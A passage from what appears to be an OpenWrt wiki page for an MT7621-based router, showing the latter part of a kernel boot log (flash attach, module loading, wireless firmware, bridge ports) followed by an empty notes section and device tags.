[    5.019032] pci 0000:00:00.0:   bridge window [io  0x1e160000-0x1e160fff]
[    5.025809] pci 0000:00:00.0:   bridge window [mem 0x60000000-0x600fffff]
[    5.032585] pci 0000:00:00.0:   bridge window [mem 0x60100000-0x601fffff pref]
[    5.039799] pci 0000:02:00.0: BAR 0: assigned [mem 0x60200000-0x602fffff]
[    5.046572] pci 0000:00:01.0: PCI bridge to [bus 02]
[    5.051529] pci 0000:00:01.0:   bridge window [io  0x1e161000-0x1e161fff]
[    5.058305] pci 0000:00:01.0:   bridge window [mem 0x60200000-0x602fffff]
[    5.065081] pci 0000:00:01.0:   bridge window [mem 0x60300000-0x603fffff pref]
[    5.073672] UBI: auto-attach mtd9
[    5.077029] ubi0: attaching mtd9
[    6.293231] ubi0: scanning is finished
[    6.314519] ubi0: attached mtd9 (name "ubi", size 117 MiB)
[    6.320025] ubi0: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
[    6.326879] ubi0: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
[    6.333650] ubi0: VID header offset: 2048 (aligned 2048), data offset: 4096
[    6.340593] ubi0: good PEBs: 940, bad PEBs: 0, corrupted PEBs: 0
[    6.346581] ubi0: user volume: 2, internal volumes: 1, max. volumes count: 128
[    6.353786] ubi0: max/mean erase counter: 3/1, WL threshold: 4096, image sequence number: 1588024764
[    6.362894] ubi0: available PEBs: 0, total reserved PEBs: 940, PEBs reserved for bad PEB handling: 20
[    6.372120] ubi0: background thread "ubi_bgt0d" started, PID 466
[    6.374581] block ubiblock0_0: created from ubi0:0(rootfs)
[    6.383621] ubiblock: device ubiblock0_0 (rootfs) set to be root filesystem
[    6.390577] hctosys: unable to open rtc device (rtc0)
[    6.403524] VFS: Mounted root (squashfs filesystem) readonly on device 254:0.
[    6.414928] Freeing unused kernel memory: 1244K
[    6.419475] This architecture does not have kernel memory protection.
[    6.425901] Run /sbin/init as init process
[    7.007502] init: Console is alive
[    7.011178] init: - watchdog -
[    7.848344] kmodloader: loading kernel modules from /etc/modules-boot.d/*
[    7.885561] kmodloader: done loading kernel modules from /etc/modules-boot.d/*
[    7.904054] init: - preinit -
[    8.587377] mtk_soc_eth 1e100000.ethernet eth0: configuring for fixed/rgmii link mode
[    8.595675] mtk_soc_eth 1e100000.ethernet eth0: Link is Up - 1Gbps/Full - flow control rx/tx
[    8.604148] IPv6: ADDRCONF(NETDEV_CHANGE): eth0: link becomes ready
[    8.754509] random: jshn: uninitialized urandom read (4 bytes read)
[    8.815465] random: jshn: uninitialized urandom read (4 bytes read)
[    8.863979] random: jshn: uninitialized urandom read (4 bytes read)
[    9.379745] mt7530 mdio-bus:1f lan1: configuring for phy/gmii link mode
[    9.411856] 8021q: adding VLAN 0 to HW filter on device lan1
[   11.547766] mt7530 mdio-bus:1f lan1: Link is Up - 100Mbps/Full - flow control rx/tx
[   11.555461] IPv6: ADDRCONF(NETDEV_CHANGE): lan1: link becomes ready
[   13.662604] UBIFS (ubi0:1): Mounting in unauthenticated mode
[   13.668539] UBIFS (ubi0:1): background thread "ubifs_bgt0_1" started, PID 574
[   13.750897] UBIFS (ubi0:1): recovery needed
[   13.991695] UBIFS (ubi0:1): recovery completed
[   13.996347] UBIFS (ubi0:1): UBIFS: mounted UBI device 0, volume 1, name "rootfs_data"
[   14.004170] UBIFS (ubi0:1): LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes
[   14.014066] UBIFS (ubi0:1): FS size: 108437504 bytes (103 MiB, 854 LEBs), journal size 5459968 bytes (5 MiB, 43 LEBs)
[   14.024765] UBIFS (ubi0:1): reserved for root: 4952683 bytes (4836 KiB)
[   14.031378] UBIFS (ubi0:1): media format: w4/r0 (latest is w5/r0), UUID 08EB41F0-9E1D-4B35-B2FD-BD2E8E3C25FA, small LPT model
[   14.050011] mount_root: switching to ubifs overlay
[   14.078026] overlayfs: upper fs does not support xattr, falling back to index=off and metacopy=off.
[   14.093712] urandom-seed: Seeding with /etc/urandom.seed
[   14.287743] mt7530 mdio-bus:1f lan1: Link is Down
[   14.372126] procd: - early -
[   14.375103] procd: - watchdog -
[   14.963869] procd: - watchdog -
[   14.967356] procd: - ubus -
[   15.011407] urandom_read: 5 callbacks suppressed
[   15.011419] random: ubusd: uninitialized urandom read (4 bytes read)
[   15.027896] random: ubusd: uninitialized urandom read (4 bytes read)
[   15.038172] procd: - init -
[   15.610125] kmodloader: loading kernel modules from /etc/modules.d/*
[   15.637507] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[   15.690488] Mirror/redirect action on
[   15.703535] u32 classifier
[   15.706315]     input device check on
[   15.709992]     Actions configured
[   15.733890] Loading modules backported from Linux version v5.7-rc3-0-g6a8b55ed4056
[   15.741517] Backport generated by backports.git v5.7-rc3-1-0-gc0c7d2bb
[   15.798716] xt_time: kernel timezone is -0000
[   15.877725] mt7621-pci 1e140000.pcie: bus=2 slot=1 irq=24
[   15.883186] pci 0000:00:01.0: enabling device (0004 -> 0007)
[   15.888922] mt7603e 0000:02:00.0: enabling device (0000 -> 0002)
[   15.895156] mt7603e 0000:02:00.0: ASIC revision: 76030010
[   15.908267] urngd: v1.0.2 started.
[   16.080432] random: crng init done
[   16.521362] mt7603e 0000:02:00.0: Firmware Version: ap_pcie
[   16.526985] mt7603e 0000:02:00.0: Build Time: 20160107100755
[   16.559737] mt7603e 0000:02:00.0: firmware init done
[   16.742757] ieee80211 phy0: Selected rate control algorithm 'minstrel_ht'
[   16.754869] mt7621-pci 1e140000.pcie: bus=1 slot=0 irq=23
[   16.760422] pci 0000:00:00.0: enabling device (0004 -> 0007)
[   16.766217] mt7615e 0000:01:00.0: enabling device (0000 -> 0002)
[   16.787971] ieee80211 phy1: Selected rate control algorithm 'minstrel_ht'
[   16.794545] PPP generic driver version 2.4.2
[   16.800748] NET: Registered protocol family 24
[   16.808844] kmodloader: done loading kernel modules from /etc/modules.d/*
[   16.909150] mt7615e 0000:01:00.0: HW/SW Version: 0x8a108a10, Build Time: 20180518100604a
[   16.909150] 
[   17.228270] mt7615e 0000:01:00.0: N9 Firmware Version: 2.0, Build Time: 20200131181812
[   17.282123] mt7615e 0000:01:00.0: CR4 Firmware Version: _reserved_, Build Time: 20190121161307
[   22.457535] mtk_soc_eth 1e100000.ethernet eth0: Link is Down
[   22.468671] mtk_soc_eth 1e100000.ethernet eth0: configuring for fixed/rgmii link mode
[   22.476865] mtk_soc_eth 1e100000.ethernet eth0: Link is Up - 1Gbps/Full - flow control rx/tx
[   22.551750] mt7530 mdio-bus:1f lan1: configuring for phy/gmii link mode
[   22.587907] 8021q: adding VLAN 0 to HW filter on device lan1
[   22.593788] IPv6: ADDRCONF(NETDEV_CHANGE): eth0: link becomes ready
[   22.600580] br-lan: port 1(lan1) entered blocking state
[   22.605835] br-lan: port 1(lan1) entered disabled state
[   22.639763] device lan1 entered promiscuous mode
[   22.644410] device eth0 entered promiscuous mode
[   22.771777] mt7530 mdio-bus:1f lan2: configuring for phy/gmii link mode
[   22.804032] 8021q: adding VLAN 0 to HW filter on device lan2
[   22.810425] br-lan: port 2(lan2) entered blocking state
[   22.815782] br-lan: port 2(lan2) entered disabled state
[   22.867845] device lan2 entered promiscuous mode
[   23.015849] mt7530 mdio-bus:1f lan3: configuring for phy/gmii link mode
[   23.055929] 8021q: adding VLAN 0 to HW filter on device lan3
[   23.062152] br-lan: port 3(lan3) entered blocking state
[   23.067409] br-lan: port 3(lan3) entered disabled state
[   23.155757] device lan3 entered promiscuous mode
[   23.291743] mt7530 mdio-bus:1f wan: configuring for phy/gmii link mode
[   23.323899] 8021q: adding VLAN 0 to HW filter on device wan
[   24.759945] mt7530 mdio-bus:1f lan1: Link is Up - 100Mbps/Full - flow control rx/tx
[   24.767819] br-lan: port 1(lan1) entered blocking state
[   24.773127] br-lan: port 1(lan1) entered forwarding state
[   24.823927] IPv6: ADDRCONF(NETDEV_CHANGE): br-lan: link becomes ready
[   26.171804] mt7530 mdio-bus:1f lan2: Link is Up - 1Gbps/Full - flow control rx/tx
[   27.280574] br-lan: port 2(lan2) entered blocking state
[   27.285918] br-lan: port 2(lan2) entered forwarding state
[   27.295947] br-lan: port 4(wlan1) entered blocking state
[   27.301330] br-lan: port 4(wlan1) entered disabled state
[   27.307461] device wlan1 entered promiscuous mode
[   30.111505] IPv6: ADDRCONF(NETDEV_CHANGE): wlan1: link becomes ready
[   30.118464] br-lan: port 4(wlan1) entered blocking state
[   30.123912] br-lan: port 4(wlan1) entered forwarding state
[   31.679796] mt7530 mdio-bus:1f wan: Link is Up - 1Gbps/Full - flow control rx/tx
[   31.687239] IPv6: ADDRCONF(NETDEV_CHANGE): wan: link becomes ready
[  115.462498] device wlan1 left promiscuous mode
[  115.467267] br-lan: port 4(wlan1) entered disabled state
[  117.306176] br-lan: port 4(wlan1) entered blocking state
[  117.311629] br-lan: port 4(wlan1) entered disabled state
[  117.317665] device wlan1 entered promiscuous mode
[  117.322921] br-lan: port 4(wlan1) entered blocking state
[  117.328286] br-lan: port 4(wlan1) entered forwarding state
[  117.490832] br-lan: port 4(wlan1) entered disabled state
[  119.909043] IPv6: ADDRCONF(NETDEV_CHANGE): wlan1: link becomes ready
[  119.915791] br-lan: port 4(wlan1) entered blocking state
[  119.921139] br-lan: port 4(wlan1) entered forwarding state
[  119.934143] br-lan: port 5(wlan1-1) entered blocking state
[  119.939712] br-lan: port 5(wlan1-1) entered disabled state
[  119.945987] device wlan1-1 entered promiscuous mode
[  119.953506] br-lan: port 5(wlan1-1) entered blocking state
[  119.959091] br-lan: port 5(wlan1-1) entered forwarding state
[  120.329403] IPv6: ADDRCONF(NETDEV_CHANGE): wlan1-1: link becomes ready
[  138.293165] br-lan: port 6(wlan0) entered blocking state
[  138.298607] br-lan: port 6(wlan0) entered disabled state
[  138.304686] device wlan0 entered promiscuous mode
[  140.072336] IPv6: ADDRCONF(NETDEV_CHANGE): wlan0: link becomes ready
[  140.079100] br-lan: port 6(wlan0) entered blocking state
[  140.084466] br-lan: port 6(wlan0) entered forwarding state
[  212.172927] device wlan0 left promiscuous mode
[  212.177677] br-lan: port 6(wlan0) entered disabled state
[  212.537868] br-lan: port 5(wlan1-1) entered disabled state
[  212.548228] device wlan1-1 left promiscuous mode
[  212.552912] br-lan: port 5(wlan1-1) entered disabled state
[  212.688998] device wlan1 left promiscuous mode
[  212.693733] br-lan: port 4(wlan1) entered disabled state
[  214.514978] br-lan: port 4(wlan0) entered blocking state
[  214.520309] br-lan: port 4(wlan0) entered disabled state
[  214.526211] device wlan0 entered promiscuous mode
[  214.531300] br-lan: port 4(wlan0) entered blocking state
[  214.536686] br-lan: port 4(wlan0) entered forwarding state
[  214.549048] br-lan: port 4(wlan0) entered disabled state
[  219.154415] IPv6: ADDRCONF(NETDEV_CHANGE): wlan0: link becomes ready
[  219.161157] br-lan: port 4(wlan0) entered blocking state
[  219.166507] br-lan: port 4(wlan0) entered forwarding state
[  219.179336] br-lan: port 5(wlan0-1) entered blocking state
[  219.185056] br-lan: port 5(wlan0-1) entered disabled state
[  219.191190] device wlan0-1 entered promiscuous mode
[  219.197520] br-lan: port 5(wlan0-1) entered blocking state
[  219.203059] br-lan: port 5(wlan0-1) entered forwarding state
[  219.575418] IPv6: ADDRCONF(NETDEV_CHANGE): wlan0-1: link becomes ready
[  302.185726] br-lan: port 5(wlan0-1) entered disabled state
[  302.195469] device wlan0-1 left promiscuous mode
[  302.200154] br-lan: port 5(wlan0-1) entered disabled state
[  302.316670] device wlan0 left promiscuous mode
[  302.321415] br-lan: port 4(wlan0) entered disabled state
[  303.021621] br-lan: port 4(wlan0) entered blocking state
[  303.027030] br-lan: port 4(wlan0) entered disabled state
[  303.033071] device wlan0 entered promiscuous mode
[  303.038274] br-lan: port 4(wlan0) entered blocking state
[  303.043672] br-lan: port 4(wlan0) entered forwarding state
[  303.256580] br-lan: port 4(wlan0) entered disabled state
[  304.810005] IPv6: ADDRCONF(NETDEV_CHANGE): wlan0: link becomes ready
[  304.816754] br-lan: port 4(wlan0) entered blocking state
[  304.822113] br-lan: port 4(wlan0) entered forwarding state</nowiki>
</WRAP>\\


===== Notes =====
//Space for additional notes, links to forum threads or other resources.//

  * ...

===== Tags =====
[[meta:tags|How to add tags]]
{{tag>ramips MT7621 128NAND 128RAM 4Port GigabitEthernet 802.11bgn 802.11ac 0USB}}